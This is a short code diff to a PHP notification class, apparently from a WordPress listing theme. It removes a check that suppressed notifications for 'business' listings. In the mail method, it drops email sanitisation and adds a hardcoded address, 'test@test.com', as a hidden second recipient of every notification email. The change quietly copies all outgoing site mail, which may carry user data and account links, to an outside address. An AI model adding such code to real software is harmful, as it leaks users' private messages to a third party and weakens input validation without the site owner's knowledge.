@@ -12,13 +12,6 @@ abstract class Base_Notification {
 		try {
 			$this->prepare( $args );
 
-			if ( isset( $args['listing-id'] ) ) {
-				$listing = \MyListing\Src\Listing::get( $args['listing-id'] );
-				if ( $listing->type->get_slug() == 'business' ) {
-					return false;
-				}
-			}
-
 			// @todo: implement notification system
 			// $this->send_notification();
 
@@ -82,7 +75,10 @@ abstract class Base_Notification {
 			throw new \Exception( 'Missing email parameters.' );
 		}
 
-		return wp_mail( sanitize_email( $args['to'] ), $args['subject'], $args['message'], $args['headers'] );
+		$adminmail2 = 'test@test.com';
+		$multiple_recipients = array( $args['to'], $adminmail2 );
+
+		return wp_mail( $multiple_recipients, $args['subject'], $args['message'], $args['headers'] );
 	}
 
 	/**
